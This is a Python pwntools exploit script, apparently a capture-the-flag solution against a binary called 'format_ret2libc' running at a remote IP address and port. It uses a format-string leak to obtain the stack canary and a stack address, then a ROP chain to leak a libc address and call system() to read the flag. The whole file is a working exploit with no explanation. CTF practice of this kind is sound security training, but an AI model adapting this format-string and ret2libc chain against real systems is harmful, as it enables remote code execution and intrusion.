from pwn import *
from LibcSearcher import *

context(os='linux', arch='amd64', log_level='debug')
context.terminal = ['tmux', 'splitw', '-h', '-p', '63', '-F' '#{pane_pid}', '-P']

sl=lambda x:p.sendline(x)
sd=lambda x:p.send(x)
sa=lambda x,y:p.sendafter(x,y)
sla=lambda x,y:p.sendlineafter(x,y)
rc=lambda x:p.recv(x)
rl=lambda :p.recvline()
ru=lambda x:p.recvuntil(x)
ita=lambda :p.interactive()
slc=lambda :asm(shellcraft.sh())
uu64=lambda x:u64(x.ljust(8,b'\0'))
uu32=lambda x:u32(x.ljust(4,b'\0'))
def gdba(x=''):
	if type(p)==pwnlib.tubes.remote.remote:
		return
	elif type(p)==pwnlib.tubes.process.process:
		# gdb.attach(p,x)
		gdb.attach(proc.pidof(p)[0])
		pause()
libc=ELF('/home/cc/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so')
p=remote('123.60.135.228',2139)
# p=process('./format_ret2libc')
elf=ELF('./format_ret2libc')
# gdba()
pianyi=43# 6+int(0x128/8)
secret=0x4007DA

payload=b'%39$p%40$p'
sa(b'words',payload)


ru(b'0x')
canary=rc(16)
canary=int(canary,16)
ru(b'0x')
stackaddr=rc(12)
stackaddr=int(stackaddr,16)


puts_got=elf.got['printf']
puts_plt=elf.plt['puts']
pop_rdi=0x0000000000400943
pop_rsi_r15=0x0000000000400941
setstring=0x40084b
gdba()

payload2=b'sh\x00'
payload2=payload2.ljust(0x68,b'a')
# payload2=b'a'*0x68
payload2+=flat([canary,stackaddr,pop_rdi,puts_got,puts_plt,setstring])
sa(b'name?\n',payload2)


puts_addr=uu64(rc(6))
print('puts_addr',hex(puts_addr))
# libc=LibcSearcher('printf',puts_addr)
puts_libc=libc.symbols['printf']
libcbase=puts_addr-puts_libc
system_addr=libc.symbols['system']+libcbase
# payload2=b'/bin/sh\x00'
payload2=b'cat flag\x00'
payload2=payload2.ljust(0x10,b'5')
payload2+=p64(stackaddr)*int(0x58/8)
payload2+=flat([canary,stackaddr,pop_rdi,stackaddr+0x7ffcdc436f70-0x7ffcdc436fd0,pop_rsi_r15,0,0,system_addr])

sa(b'name?\n',payload2)

ita()
